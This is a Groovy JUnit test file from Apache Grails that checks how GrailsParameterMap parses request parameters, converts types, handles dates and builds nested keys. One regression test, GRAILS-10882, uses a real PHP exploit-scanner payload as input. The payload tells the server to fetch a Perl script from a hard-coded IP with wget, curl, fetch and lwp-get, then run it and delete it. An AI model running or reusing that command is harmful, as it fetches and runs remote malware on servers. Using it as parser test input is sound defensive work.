/*
 *  Licensed to the Apache Software Foundation (ASF) under one
 *  or more contributor license agreements.  See the NOTICE file
 *  distributed with this work for additional information
 *  regarding copyright ownership.  The ASF licenses this file
 *  to you under the Apache License, Version 2.0 (the
 *  "License"); you may not use this file except in compliance
 *  with the License.  You may obtain a copy of the License at
 *
 *    https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing,
 *  software distributed under the License is distributed on an
 *  "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 *  KIND, either express or implied.  See the License for the
 *  specific language governing permissions and limitations
 *  under the License.
 */
package grails.web.servlet.mvc

import org.junit.jupiter.api.Test
import org.springframework.context.support.StaticMessageSource
import org.springframework.mock.web.MockHttpServletRequest
import org.springframework.mock.web.MockServletContext
import org.springframework.web.context.request.RequestContextHolder
import org.springframework.web.context.support.GenericWebApplicationContext
import spock.lang.Issue

import static org.junit.jupiter.api.Assertions.*

class GrailsParameterMapTests {

    GrailsParameterMap theMap
    MockHttpServletRequest mockRequest = new MockHttpServletRequest()

    @Test
    void testSubmapViaArraySubscript() {
        mockRequest.addParameter("name", "Dierk Koenig")
        mockRequest.addParameter("dob", "01/01/1970")
        mockRequest.addParameter("address.postCode", "345435")
        mockRequest.addParameter("address.town", "Swindon")
        theMap = new GrailsParameterMap(mockRequest)

        assert theMap['name', 'dob'] == [name:"Dierk Koenig", dob:"01/01/1970"]
    }

    @Test
    void testDateMessageSourceFormat() {

        try {
            GenericWebApplicationContext ctx = new GenericWebApplicationContext(new MockServletContext())
            final messageSource = new StaticMessageSource()
            ctx.defaultListableBeanFactory.registerSingleton("messageSource", messageSource)
            ctx.refresh()
            final webRequest = grails.util.GrailsWebMockUtil.bindMockWebRequest(ctx)
            messageSource.addMessage("date.myDate.format", webRequest.locale, "yyMMdd")
            def request = webRequest.currentRequest
            def params = new GrailsParameterMap(request)
            params['myDate'] = '710716'
            def val = params.date('myDate')
            def cal = new GregorianCalendar(1971,6,16)
            assert val == cal.time
        } finally {
            RequestContextHolder.resetRequestAttributes()
        }
    }

    @Test
    void testDateMethodMultipleFormats() {
        def request = new MockHttpServletRequest()
        def params = new GrailsParameterMap(request)
        params['myDate'] = '710716'

        def val = params.date('myDate', ['yyyy-MM-dd', 'yyyyMMdd', 'yyMMdd'])

        def cal = new GregorianCalendar(1971,6,16)

        assert val == cal.time
    }

    @Test
    void testDateMethod() {
        def request = new MockHttpServletRequest()
        def params = new GrailsParameterMap(request)
        params['myDate'] = '16-07-1971'

        def val = params.date('myDate', 'dd-MM-yyyy')

        def cal = new GregorianCalendar(1971,6,16)

        assert val == cal.time
    }

    @Test
    void testParseRequestBodyForPutRequest() {
        def request = new MockHttpServletRequest()
        request.content = 'foo=bar&one=two'.bytes
        request.method = 'PUT'
        request.contentType = "application/x-www-form-urlencoded"

        def params = new GrailsParameterMap(request)

        assert 'bar' == params.foo
        assert 'two' == params.one

        params = new GrailsParameterMap(request)
        assert params.foo == null // should be null, request can't be parsed twice

        request = new MockHttpServletRequest()
        request.method = 'PUT'
        request.content = 'foo='.bytes
        request.contentType = "application/x-www-form-urlencoded"
        request.removeAttribute(GrailsParameterMap.REQUEST_BODY_PARSED)

        params = new GrailsParameterMap(request)

        assert '' == params.foo
    }

    @Test
    void testParseRequestBodyForPutRequestWithCharset() {
        def request = new MockHttpServletRequest()
        request.content = 'foo=bar&one=two'.bytes
        request.method = 'PUT'
        request.contentType = "application/x-www-form-urlencoded; charset=UTF-8"

        def params = new GrailsParameterMap(request)

        assert 'bar' == params.foo
        assert 'two' == params.one

        params = new GrailsParameterMap(request)
        assert params.foo == null // should be null, request can't be parsed twice

        request = new MockHttpServletRequest()
        request.method = 'PUT'
        request.contentType = "application/x-www-form-urlencoded; charset=UTF-8"
        request.content = 'foo='.bytes
        request.removeAttribute(GrailsParameterMap.REQUEST_BODY_PARSED)

        params = new GrailsParameterMap(request)

        assert '' == params.foo
    }

    @Test
    void testParseRequestBodyForPatchRequest() {
        def request = new MockHttpServletRequest()
        request.content = 'foo=bar&one=two'.bytes
        request.method = 'PATCH'
        request.contentType = "application/x-www-form-urlencoded"

        def params = new GrailsParameterMap(request)

        assert 'bar' == params.foo
        assert 'two' == params.one

        params = new GrailsParameterMap(request)
        assert params.foo == null // should be null, request can't be parsed twice

        request = new MockHttpServletRequest()
        request.content = 'foo=bar&one=two'.bytes
        request.method = 'PATCH'
        request.contentType = "application/x-www-form-urlencoded"
        request.content = 'foo='.bytes
        request.removeAttribute(GrailsParameterMap.REQUEST_BODY_PARSED)

        params = new GrailsParameterMap(request)

        assert '' == params.foo
    }

    @Test
    void testPlusOperator() {
        mockRequest.addParameter("album", "Foxtrot")

        def originalMap = new GrailsParameterMap(mockRequest)

        def newMap = originalMap + [vocalist: 'Peter']
        assertTrue originalMap.containsKey('album')
        assertFalse originalMap.containsKey('vocalist')
        assertTrue newMap.containsKey('album')
        assertTrue newMap.containsKey('vocalist')
    }

    @Test
    void testMultiDimensionParamsWithUnderscore() {
        mockRequest.addParameter("a.b.c", "on")
        mockRequest.addParameter("_a.b.c", "")
        theMap = new GrailsParameterMap(mockRequest)
        assert theMap['a.b.c'] == "on"
        assert theMap['_a.b.c'] == ""
        assert theMap['a'] instanceof Map
        assert theMap['a']['b'] instanceof Map
        assert theMap['a']['b']['c'] == "on"
        assert theMap['a']['_b.c'] == ""
        assert theMap['a']['b']['_c'] == ""
    }

    @Test
    void testConversionHelperMethods() {
        def map = new GrailsParameterMap(mockRequest)

        map.zero = "0"
        map.one = "1"
        map.bad = "foo"
        map.decimals = "1.4"
        map.bool = "true"
        map.aList = [1,2]
        map.array = ["one", "two" ] as String[]
        map.longNumber = 1234567890
        map.z = 'z'

        assertEquals(["1"], map.list("one"))
        assertEquals([1,2], map.list("aList"))
        assertEquals(["one","two"], map.list("array"))
        assertEquals([], map.list("nonexistant"))

        assertEquals 1, map.byte('one')
        assertEquals(-46, map.byte('longNumber')) // overflows
        assertNull map.byte("test")
        assertNull map.byte("bad")
        assertNull map.byte("nonexistant")
        assertEquals 0, map.byte('zero')
        assertEquals 1, map.byte('one', 42 as Byte)
        assertEquals 0, map.byte('zero', 42 as Byte)
        assertEquals 42, map.byte('bad', 42 as Byte)
        assertEquals 42, map.byte('nonexistent', 42 as Byte)
        assertEquals 1, map.byte('one', 42)
        assertEquals 0, map.byte('zero', 42)
        assertEquals 42, map.byte('bad', 42)
        assertEquals 42, map.byte('nonexistent', 42)

        assertEquals '1' as char, map.char('one')
        assertNull map.char('longNumber')
        assertNull map.char("test")
        assertNull map.char("bad")
        assertNull map.char("nonexistant")
        assertEquals '0' as char, map.char('zero')
        assertEquals '1' as char, map.char('one', 'A' as Character)
        assertEquals '0' as char, map.char('zero', 'A' as Character)
        assertEquals 'A' as char, map.char('bad', 'A' as Character)
        assertEquals 'A' as char, map.char('nonexistent', 'A' as Character)
        assertEquals '1' as char, map.char('one', (char)'A')
        assertEquals '0' as char, map.char('zero', (char)'A')
        assertEquals 'A' as char, map.char('bad', (char)'A')
        assertEquals 'A' as char, map.char('nonexistent', (char)'A')
        assertEquals 'z' as char, map.char('z')
        assertEquals 'z' as char, map.char('z', (char)'A')
        assertEquals 'z' as char, map.char('z', 'A' as Character)

        assertEquals 1, map.int('one')
        assertNull map.int("test")
        assertNull map.int("bad")
        assertNull map.int("nonexistant")
        assertEquals 0, map.int('zero')
        assertEquals 1, map.int('one', 42)
        assertEquals 0, map.int('zero', 42)
        assertEquals 42, map.int('bad', 42)
        assertEquals 42, map.int('nonexistent', 42)

        assertEquals 1L, map.long('one')
        assertNull map.long("test")
        assertNull map.long("bad")
        assertNull map.long("nonexistant")
        assertEquals 0L, map.long('zero')
        assertEquals 1L, map.long('one', 42L)
        assertEquals 0L, map.long('zero', 42L)
        assertEquals 42L, map.long('bad', 42L)
        assertEquals 42L, map.long('nonexistent', 42L)

        assertEquals 1, map.short('one')
        assertNull map.short("test")
        assertNull map.short("bad")
        assertNull map.short("nonexistant")
        assertEquals 0, map.short('zero')
        assertEquals 1, map.short('one', 42 as Short)
        assertEquals 0, map.short('zero', 42 as Short)
        assertEquals 42, map.short('bad', 42 as Short)
        assertEquals 42, map.short('nonexistent', 42 as Short)
        assertEquals 1, map.short('one', 42)
        assertEquals 0, map.short('zero', 42)
        assertEquals 42, map.short('bad', 42)
        assertEquals 42, map.short('nonexistent', 42)

        assertEquals 1.0, map.double('one')
        assertEquals 1.4, map.double('decimals')
        assertNull map.double("bad")
        assertNull map.double("nonexistant")
        assertEquals 0.0, map.double('zero')
        assertEquals 1.0, map.double('one', 42.0)
        assertEquals 0.0, map.double('zero', 42.0)
        assertEquals 42.0, map.double('bad', 42.0)
        assertEquals 42.0, map.double('nonexistent', 42.0)

        assertEquals 1.0f, map.float('one')
        assertEquals 1.399999976158142f, map.float('decimals')
        assertNull map.float("bad")
        assertNull map.float("nonexistant")
        assertEquals 0.0f, map.float('zero')
        assertEquals 1.0f, map.float('one', 42.0f)
        assertEquals 0.0f, map.float('zero', 42.0f)
        assertEquals 42.0f, map.float('bad', 42.0f)
        assertEquals 42.0f, map.float('nonexistent', 42.0f)

        assertEquals true, map.boolean('one')
        assertEquals true, map.boolean('nonexistent', Boolean.TRUE)
        assertEquals false, map.boolean('nonexistent', Boolean.FALSE)
        assertEquals true, map.boolean('bool')
        assertNull map.boolean("nonexistant")
        assertNull map.boolean('my_checkbox')
        map.my_checkbox = false
        assertEquals false, map.boolean('my_checkbox')
        map.my_checkbox = true
        assertEquals true, map.boolean('my_checkbox')
        map.my_checkbox = 'false'
        assertEquals false, map.boolean('my_checkbox')
        map.my_checkbox = 'true'
        assertEquals true, map.boolean('my_checkbox')
        map.my_checkbox = 'some bogus value'
        assertEquals false, map.boolean('my_checkbox')
        map.my_checkbox = 'off'
        assertEquals false, map.boolean('my_checkbox')
        map.my_checkbox = 'on'
        assertEquals true, map.boolean('my_checkbox')
    }

    @Test
    @Issue("https://github.com/apache/grails-core/issues/11126")
    void testDontAutoEvaluateBlankDates() {
        mockRequest.addParameter("foo", "date.struct")
        mockRequest.addParameter("foo_year", "")
        mockRequest.addParameter("foo_month", "")

        theMap = new GrailsParameterMap(mockRequest)
        assert theMap['foo'] == "date.struct" : "should not be modified"
    }

    @Test
    @Issue("https://github.com/apache/grails-core/issues/11126")
    void testDontAutoEvaluateDates() {
        mockRequest.addParameter("foo", "date.struct")
        mockRequest.addParameter("foo_year", "2007")
        mockRequest.addParameter("foo_month", "07")

        theMap = new GrailsParameterMap(mockRequest)
        assert theMap['foo'] == "date.struct" : "should not be modified"
    }

    @Test
    @Issue("https://github.com/apache/grails-core/issues/11126")
    void testGetDateDoesConversion() {
        mockRequest.addParameter("foo", "date.struct")
        mockRequest.addParameter("foo_year", "2007")
        mockRequest.addParameter("foo_month", "07")

        theMap = new GrailsParameterMap(mockRequest)
        final Calendar calendar = Calendar.getInstance()
        assert theMap.getDate("foo").getClass() == java.util.Date
        calendar.setTime(theMap.getDate("foo"))
        assert calendar.get(Calendar.YEAR) == 2007
        assert calendar.get(Calendar.MONTH) == Calendar.JULY
    }

    @Test
    void testIterateOverMapContainingDate() {
        mockRequest.addParameter("stuff", "07")
        mockRequest.addParameter("foo", "date.struct")
        mockRequest.addParameter("foo_year", "2007")
        mockRequest.addParameter("foo_month", "07")
        mockRequest.addParameter("bar", "07")

        theMap = new GrailsParameterMap(mockRequest)

        def params = new GrailsParameterMap(mockRequest)
        for (Object o : theMap.keySet()) {
            String name = (String) o
            params.put(name, theMap.get(name))
        }


    }

    @Test
    void testMultiDimensionParams() {
        mockRequest.addParameter("a.b.c", "cValue")
        mockRequest.addParameter("a.b", "bValue")
        mockRequest.addParameter("a.bc", "bcValue")
        mockRequest.addParameter("a.b.d", "dValue")
        mockRequest.addParameter("a.e.f", "fValue")
        mockRequest.addParameter("a.e.g", "gValue")
        theMap = new GrailsParameterMap(mockRequest)
        assert theMap['a'] instanceof Map
        assert theMap.a.b == "bValue"
        assert theMap.a.'b.c' == "cValue"
        assert theMap.a.'bc' == "bcValue"
        assert theMap.a.'b.d' == "dValue"

        assert theMap.a['e'] instanceof Map
        assert theMap.a.e.f == "fValue"
        assert theMap.a.e.g == "gValue"
    }

    @Test
    void testToQueryString() {
        mockRequest.addParameter("name", "Dierk Koenig")
        mockRequest.addParameter("dob", "01/01/1970")
        theMap = new GrailsParameterMap(mockRequest)

        def queryString = theMap.toQueryString()

        assertTrue queryString.startsWith('?')
        queryString = queryString[1..-1].split('&')

        assert queryString.find { it == 'name=Dierk+Koenig' }
        assert queryString.find { it == 'dob=01%2F01%2F1970' }
    }

    @Test
    void testSimpleMappings() {
        mockRequest.addParameter("test", "1")
        theMap = new GrailsParameterMap(mockRequest)

        assertEquals "1", theMap['test']
    }

    @Test
    void testToQueryStringWithMultiD() {
        mockRequest.addParameter("name", "Dierk Koenig")
        mockRequest.addParameter("dob", "01/01/1970")
        mockRequest.addParameter("address.postCode", "345435")
        mockRequest.addParameter("address.town", "Swindon")
        theMap = new GrailsParameterMap(mockRequest)

        def queryString = theMap.toQueryString()

        assertTrue queryString.startsWith('?')
        queryString = queryString[1..-1].split('&')

        assert queryString.find { it == 'name=Dierk+Koenig' }
        assert queryString.find { it == 'dob=01%2F01%2F1970' }
        assert queryString.find { it == 'address.postCode=345435' }
        assert queryString.find { it == 'address.town=Swindon' }
    }

    @Test
    void testCloning() {
        mockRequest.addParameter("name", "Dierk Koenig")
        mockRequest.addParameter("dob", "01/01/1970")
        mockRequest.addParameter("address.postCode", "345435")
        theMap = new GrailsParameterMap(mockRequest)

        GrailsParameterMap theClone = theMap.clone()

        assertEquals(theMap.size(), theClone.size(), "clone size should be the same as original")

        theMap.each { k, v ->
            assertEquals(theMap[k], theClone[k], "the clone should have the same value for $k as the original")
        }
    }

    @Test
    void testNestedKeyAutoGeneration() {
        def request = new MockHttpServletRequest()
        def params = new GrailsParameterMap(request)

        params.'company.department.team.numberOfEmployees' = 42
        params.'company.department.numberOfEmployees' = 2112
        def firstKey = 'alpha'
        def secondKey = 'beta'
        params."${firstKey}.${secondKey}.foo" = 'omega'
        params.put "prefix.${firstKey}.${secondKey}", 'delta'

        def company = params.company
        assert company instanceof Map

        def department = company.department
        assert department instanceof Map
        assert department.numberOfEmployees == 2112

        def team = department.team
        assert team instanceof Map

        assert team.numberOfEmployees == 42

        assert params['alpha'] instanceof Map
        assert params['alpha']['beta'] instanceof Map
        assert params['alpha']['beta'].foo == 'omega'

        assert params['prefix'] instanceof Map
        assert params['prefix']['alpha'] instanceof Map
        assert params['prefix']['alpha'].beta == 'delta'
    }

    @Test
    // GRAILS-10882
    void testGRAILS10882() {
        def request = new MockHttpServletRequest('POST', '/cgi-bin/php.cgi')
        def phpExploitScannerBody = '<?php system("cd /var/tmp;rm -rf mc.pl*;wget https://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;curl -O https://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;fetch https://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;lwp-get https://164.177.157.215/drupal/themes/bartik/images/log/-log/mc.pl;perl mc.pl;rm -rf mc.pl;cd /dev/shm;rm -rf mc.pl*;wget https://164.177.157.215/drupal/themes/bartik/images/log/-log/'
        request.setParameter(phpExploitScannerBody, '')
        long startTime = System.currentTimeMillis()
        def params = new GrailsParameterMap(request)
        assert params != null
        assert params.size() > 0
        assert System.currentTimeMillis() - startTime < 1000L
    }

    @Test
    void testNestedKeys() {
        def request = new MockHttpServletRequest()
        def requestParams = ['a.b.c.d': '1', 'a.b.e': '2']
        request.setParameters(requestParams)
        def params = new GrailsParameterMap(request)
        assert '[a.b.c.d:1, a:[b.c.d:1, b:[c.d:1, c:[d:1], e:2], b.e:2], a.b.e:2]' == params.toString()
        assert params != null
    }
}
